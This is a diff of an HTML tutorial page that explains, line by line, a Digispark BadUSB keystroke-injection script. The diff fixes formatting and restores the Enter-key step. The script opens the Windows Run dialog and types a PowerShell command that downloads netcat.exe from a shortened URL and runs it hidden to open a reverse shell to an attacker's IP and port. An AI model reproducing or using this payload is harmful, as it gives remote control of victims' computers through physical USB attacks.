@@ -62,12 +62,12 @@
 <p>The sendKeyStroke() function is used to simulate pressing the 'R' key along with the left GUI (Windows key) modifier.</p>
 
 <code>DigiKeyboard.delay(700);</code>
-  <p>A delay of 700 milliseconds (0.7 seconds) is introduced.</p>
+ <p>A delay of 700 milliseconds (0.7 seconds) is introduced.</p>
 
 <code>DigiKeyboard.print("powershell curl -o netcat.exe https://bit.ly/3G3R1d1 ; powershell -w hidden netcat.exe <ip> <port> -e powershell.exe");</code>
 <p>The print() function is used to simulate typing the provided string, which contains a PowerShell command.</p>
   
-<code>code></code>
+<code>DigiKeyboard.sendKeyStroke(KEY_ENTER);</code>
 <p>The sendKeyStroke() function is used to simulate pressing the Enter key.</p>
 
 <code>void loop(){}</code>
